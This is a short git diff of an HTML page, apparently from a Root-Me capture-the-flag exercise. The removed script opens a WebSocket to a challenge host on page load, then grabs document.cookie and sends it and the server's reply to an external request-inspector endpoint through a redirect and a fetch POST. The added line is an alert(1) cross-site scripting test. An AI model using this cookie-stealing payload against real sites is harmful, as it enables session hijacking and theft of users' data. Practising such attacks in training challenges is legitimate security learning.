@@ -3,28 +3,7 @@
 <head>
   <title>Code d'exécution automatique</title>
   <script>
-    window.addEventListener('load', function() {
-      // Votre code JavaScript à exécuter
-      websocket = new WebSocket('ws://http://ctf28.root-me.org/room');
-      websocket.onopen = start;
-      websocket.onmessage = handleReply;
-
-      function start(event) {
-        websocket.send("attackers-message");
-      }
-
-      function handleReply(event) {
-	var cookie = document.cookie;
-        // Rediriger vers l'URL avec le cookie dans le paramètre "c"
-        document.location = 'https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?c=' + encodeURIComponent(cookie);
-
-        fetch('https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/', {
-          method: 'POST',
-          mode: 'no-cors',
-          body: event.data
-        });
-      }
-    });
+	  alert(1);
   </script>
 </head>
 <body>
